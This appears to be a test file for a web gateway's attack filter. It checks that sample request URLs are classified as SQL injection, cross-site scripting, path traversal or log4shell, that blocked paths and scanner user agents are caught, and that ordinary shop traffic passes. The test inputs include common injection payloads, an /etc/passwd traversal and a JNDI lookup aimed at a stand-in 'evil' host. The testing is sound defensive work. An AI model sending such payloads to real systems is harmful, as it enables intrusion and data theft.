import { describe, expect, it } from 'vitest';
import http from 'http';
import { EdgeProtection } from '@fromcode119/core';
import { GatewayAttackFilter } from '@cli/services/gateway/challenge/gateway-attack-filter';

class RequestFixture {
  static of(url: string, userAgent = 'Mozilla/5.0'): http.IncomingMessage {
    return { url, headers: { 'user-agent': userAgent } } as unknown as http.IncomingMessage;
  }
}

describe('GatewayAttackFilter', () => {
  const on = new EdgeProtection([], 0, [], '', '', 0, true, ['/.env', '/wp-login.php', '/.git/'], ['sqlmap', 'Nikto']);
  const reason = (url: string, agent?: string, protection = on) => GatewayAttackFilter.reasonFor(RequestFixture.of(url, agent), protection);

  it('refuses the known attacks in a request address, encoded once or twice', () => {
    expect(reason('/products?id=1 UNION ALL SELECT password FROM users')).toBe('sql_injection');
    expect(reason('/products?id=1%20union%20select%201,2')).toBe('sql_injection');
    expect(reason('/products?id=1%2520union%2520select%25201')).toBe('sql_injection');
    expect(reason("/login?user=admin' OR '1'='1")).toBe('sql_injection');
    expect(reason('/search?q=1 AND SLEEP(5)')).toBe('sql_injection');
    expect(reason('/x?t=information_schema.tables')).toBe('sql_injection');
    expect(reason('/search?q=<script>alert(1)</script>')).toBe('script_injection');
    expect(reason('/r?next=javascript:alert(1)')).toBe('script_injection');
    expect(reason('/p?img=x onerror=alert(1)')).toBe('script_injection');
    expect(reason('/files/..%2f..%2fetc/passwd')).toBe('path_traversal');
    expect(reason('/?x=${jndi:ldap://evil/a}')).toBe('log4shell');
  });

  it('refuses the blocked paths and tools, in any case', () => {
    expect(reason('/.env')).toBe('blocked_path');
    expect(reason('/WP-LOGIN.PHP')).toBe('blocked_path');
    expect(reason('/.git/config')).toBe('blocked_path');
    expect(reason('/', 'sqlmap/1.7.2#stable')).toBe('blocked_tool');
    expect(reason('/', 'Mozilla/5.00 (Nikto/2.1.6)')).toBe('blocked_tool');
  });

  it('lets ordinary shop traffic through', () => {
    for (const url of [
      '/', '/products/union-jack-flag', '/search?q=select size', '/search?q=sleep mask', '/category/scripts-and-fonts',
      "/search?q=o'neill jacket", '/blog/javascript-tips', '/api/collections/products?where[name][like]=onion',
      '/products?sort=price&order=desc', '/environment', '/gitbook', '/search?q=1=1 bundle',
    ]) {
      expect(reason(url)).toBeNull();
    }
  });

  it('refuses nothing while the switch is off', () => {
    const off = new EdgeProtection([], 0, [], '', '', 0, false, ['/.env'], ['sqlmap']);
    expect(reason('/.env', 'sqlmap', off)).toBeNull();
    expect(reason('/x?id=1 union select 1', undefined, off)).toBeNull();
  });
});
